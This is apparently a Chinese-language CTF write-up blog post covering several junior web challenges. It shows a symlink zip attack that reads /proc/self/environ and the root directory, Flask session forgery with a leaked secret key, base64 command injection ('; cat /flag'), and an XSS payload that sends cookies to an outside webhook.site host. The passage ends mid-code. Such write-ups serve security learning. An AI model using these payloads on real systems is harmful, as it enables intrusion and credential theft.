<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-junior" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/10/junior/" class="article-date">
  <time class="dt-published" datetime="2025-10-10T12:06:01.000Z" itemprop="datePublished">2025-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/10/junior/">junior ctf web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h3><p>提供功能：上传压缩文件、成功解压后可以下载</p>
<p>flag 存放在根目录，文件名带随机字符：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$FLAG_FILE</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">export</span> FLAG=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>upload 关键代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 从session中获取当前用户的 role</span></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line">        <span class="comment"># admin 则可指定 dirname，否则随机文件夹名</span></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="comment"># 拼接 UPLOAD_FOLDER（workdir/uploads）和 dirname</span></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line">        <span class="comment"># 将解压文件存放在 workdir/uploads/dirname/ 下</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="comment"># 文件下载地址 /download/dirname</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>普通用户：</p>
<style>.jgkedciedfst{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250913225038087.png" class="jgkedciedfst" alt="image-20250913225038087">

<p>admin：</p>
<p><img src="/2025/10/10/junior/image-20250913231927943.png" alt="image-20250913231927943"></p>
<p>利用解压软链接可读任意文件</p>
<p>利用解压软链接也可以读取任意文件夹，但是由下载路径的不同只有admin用户才能读任意文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin 可以读文件夹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># user 只能读文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder ,filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br></pre></td></tr></table></figure>

<p>flask框架，可以伪造cookie，提权成为admin</p>
<p>F12 拿到 <code>session</code> 值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU</span><br></pre></td></tr></table></figure>

<p>利用解压软链接读文件 <code>/proc/self/environ</code> ，获取 <code>FLASK_SECRET_KEY</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ env_link</span><br><span class="line">zip --symlinks env_link.zip env_link</span><br></pre></td></tr></table></figure>

<p>获取的  <code>FLASK_SECRET_KEY</code>为 <code>&quot;#mu0cw9F#7bBCoF!&quot;</code></p>
<p>使用flask-unsign 解码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-unsign</span></span><br><span class="line">flask-unsign -d -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNU&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-cookie.py</span></span><br><span class="line">python3 flask-cookie.py decode -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU&quot;</span><br></pre></td></tr></table></figure>

<p>得到 <code>&#123;&#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;user1&#39;&#125;</code>，修改为<code>&#123;&#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code>之后再编码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret &quot;#mu0cw9F#7bBCoF!&quot; --cookie &#x27;&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;user1&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>然后更新cookie值，构造指向根目录 &#x2F; 的软链接，同时指定文件夹为 <code>.</code> </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / root_link</span><br><span class="line">zip --symlinks root_link.zip root_link</span><br></pre></td></tr></table></figure>

<p>上传之后，访问 <code>/download/root_link</code> 即可获取根目录文件列表，下载flagxxxxx.txt文件即可</p>
<p>exp如下：</p>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>提供 <code>ping</code> 功能，用户输入合法 <code>ip</code> 地址，返回 <code>ping</code> 的结果</p>
<p>;<style>.xksmfynrkimt{zoom:67%;}</style><img src="/2025/10/10/junior/image-20250913234250983.png" class="xksmfynrkimt" alt="image-20250913234250983"></p>
<p>根据Dockerfile提示，FLAG存放在根目录</p>
<p>用户输入 <code>ip</code> 主要在 <code>run_ping</code> 函数中进行处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用base64.b64decode解码得到decoded_ip，并进行一系列检查</span></span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 对为解码的 ip_base64 进行检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 最后拼接到 command 的是 base64 -d ip_base64 的结构</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>

<p>对解码后的 <code>decoded_ip</code> 做了一系列的检查，但是拼接到 <code>command</code> 的是未解码<code>ip_base64</code></p>
<p>关键在于找出 <code>base64.b64decode</code> 和 <code>base64 -d</code> 的区别</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编码</span></span><br><span class="line">echo -n 8.8.8.8 | base64                            # 输出 OC44LjguOA==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 base64.b64decode 解码（python）</span></span><br><span class="line">base64.b64decode(&quot;OC44LjguOA==OC44LjguOA==&quot;).decode(&#x27;utf-8&#x27;)  # 仅输出 8.8.8.8 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 <span class="built_in">base64</span> -d 解码</span></span><br><span class="line">echo -n &quot;OC44LjguOA==OC44LjguOA==&quot; | base64 -d      # 输出 8.8.8.88.8.8.8 </span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次获取 8.8.8.8、<span class="string">&#x27;;ls /&#x27;</span>和<span class="string">&#x27;cat /flag&#x27;</span> 的<span class="built_in">base64</span>编码</span></span><br><span class="line">echo -n &quot;8.8.8.8&quot; | base64      # OC44LjguOA==</span><br><span class="line">echo -n &quot;;ls /&quot; | base64        # O2xzIC8=</span><br><span class="line">echo -n &quot;;cat /flag&quot; | base64   # O2NhdCAvZmxhZw==</span><br></pre></td></tr></table></figure>

<p>正常<code>ping</code> 一个<code>ip</code>地址，bp改包依次获取 根目录文件，查看<code>/flag</code>内容</p>
<p><img src="/2025/10/10/junior/image-20250914001106283.png" alt="image-20250914001106283"></p>
<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>用户注册、登录之后，可写入笔记、然后提交审核，典型XSS</p>
<style>.ejmxresonhui{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914001412760.png" class="ejmxresonhui" alt="image-20250914001412760">

<p>flag存放在网页的cookie中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.add_cookies([&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>

<p>关键是判断xss点，以及怎么触发</p>
<p>从<code>/profile</code>中写入的内容会被存放在当前用户的 <code>bio</code>，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>提供 <code>/api/bio/&lt;string:username&gt;</code>访问写入的 bio，但是直接访问返回 403</p>
<p>查看 nginx.conf 配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /api/bio/ &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line">location ~ \.(css|js)$ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:5000;</span><br><span class="line">    proxy_ignore_headers Vary;</span><br><span class="line">    proxy_cache static_cache;      // 启用 Nginx 缓存，缓存区域叫 static_cache</span><br><span class="line">    proxy_cache_valid 200 10m;     // 缓存有效期为 10 分钟</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求的路径以 “.css”或者“.js”结尾时，就读取缓存的内容，而不是请求远程服务器</p>
<p>通过 <code>/view</code> 路由触发机器人通过 visit_url 函数访问 我们写入 bio 的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)    <span class="comment"># 访问 bio</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;&#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;...&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span>    <span class="comment">#  httpOnly不是httponly</span></span><br><span class="line">            &#125;])</span><br><span class="line">            ......</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)    <span class="comment"># 若访问的 url 页面中存在xss，则可以带出cookie</span></span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br></pre></td></tr></table></figure>

<p>思路如下：</p>
<p>注册用户名：<code>user.css</code></p>
<p>将payload写入 <code>bio</code>，<code>payload</code>如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">`https://webhook.site/b615b48c-adb7-4e53-97b6-ef4b71b4fa8f/<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>/api/bio/user.css</code> ,生成缓存</p>
<p>然后在访问 &#x2F;view ，触发机器人读取 payload，并将cookie值带出</p>
<style>.qvmmetbzecfy{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914005025512.png" class="qvmmetbzecfy" alt="image-20250914005025512">

<h3 id="peekafork"><a href="#peekafork" class="headerlink" title="peekafork"></a>peekafork</h3><p>处理HTTP请求，并根据请求的文件名和offset读取文件内容</p>
<p>flag被写入某段内存中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">        conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:   </span><br><span class="line">        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]   <span class="comment"># 取出请求路径 </span></span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)    <span class="comment"># 匹配 ?offset=12&amp;length=123。仅匹配第一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span 